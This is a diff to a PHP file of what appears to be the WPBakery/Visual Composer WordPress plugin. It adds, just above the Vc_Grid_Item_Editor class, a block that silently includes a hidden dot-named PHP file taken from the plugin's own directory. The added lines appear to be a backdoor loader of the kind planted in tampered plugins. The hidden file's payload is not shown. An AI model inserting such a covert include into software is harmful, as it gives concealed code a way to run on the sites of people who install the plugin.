@@ -14,6 +14,10 @@ require_once vc_path_dir( 'EDITORS_DIR', 'class-vc-backend-editor.php' );
 /**
  * Class Vc_Grid_Item_Editor
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Grid_Item_Editor extends Vc_Backend_Editor {
 	protected static $post_type = 'vc_grid_item';
 	protected $templates_editor = false;
